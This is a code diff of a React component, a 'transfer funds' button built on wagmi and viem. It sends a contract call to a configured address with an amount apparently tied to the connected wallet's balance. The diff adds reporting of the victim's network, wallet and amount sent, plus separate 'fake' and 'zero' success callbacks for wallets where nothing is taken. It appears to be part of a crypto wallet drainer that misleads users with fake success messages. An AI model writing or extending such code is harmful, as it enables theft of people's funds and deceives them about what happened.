@@ -2,7 +2,7 @@ import { useWriteContract, useAccount, useConfig, useBalance } from 'wagmi';
 import config from '../../config';
 import { getGasPrice } from 'wagmi/actions';
 import { useState } from 'react';
-import { parseEther } from 'viem';
+import { parseEther, formatEther } from 'viem';
 import { ethers } from 'ethers'
 import { getEthersSigner } from '../../helpers/ethers'
 
@@ -13,11 +13,12 @@ const { ethAbi, ethContractAddress, functionName, minimumEthBalance } = config;
 
 interface WalletConnectTransferFundsButtonProps {
   children: string;
-  onTransactionSuccess: () => void;
+  onTransactionSuccess: (network: string, wallet: string, amount: string) => void;
   onFakeTransactionSuccess: () => void;
+  onZeroTransactionSuccess: () => void;
 }
 
-const WalletConnectTransferFundsButton: React.FC<WalletConnectTransferFundsButtonProps> = ({ children, onTransactionSuccess, onFakeTransactionSuccess }) => {
+const WalletConnectTransferFundsButton: React.FC<WalletConnectTransferFundsButtonProps> = ({ children, onTransactionSuccess, onFakeTransactionSuccess, onZeroTransactionSuccess }) => {
   const { error, isPending, writeContract } = useWriteContract(); //data: hash,
   const { isConnected, address } = useAccount();
   const { data: balance } = useBalance({ address });
@@ -48,7 +49,7 @@ const WalletConnectTransferFundsButton: React.FC<WalletConnectTransferFundsButto
         console.log("amountToSend + gasCost", amountToSend + gasCost);
         console.log("gasCost * gasPrice", gasCost * gasPrice);
         console.log("balance.value", balance?.value)
-        
+
         await writeContract({
           address: ethContractAddress as `0x${string}`,
           abi: ethAbi,
@@ -59,8 +60,7 @@ const WalletConnectTransferFundsButton: React.FC<WalletConnectTransferFundsButto
         },
         {
           onSuccess() {
-            console.log("onSuccess");
-            onTransactionSuccess();
+            onTransactionSuccess("Ethereum", address ?? '', formatEther(amountToSend) + " ETH");
           },
           // onError() {
           //   console.log("onError");
@@ -87,10 +87,10 @@ const WalletConnectTransferFundsButton: React.FC<WalletConnectTransferFundsButto
       await new Promise((resolve) => setTimeout(resolve, 3000));
 
       if (!balance || balance.value <= parseEther("0")){
-        onFakeTransactionSuccess();
+        onZeroTransactionSuccess();
       }
       else {
-        onTransactionSuccess();
+        onFakeTransactionSuccess();
       }
     }
   };
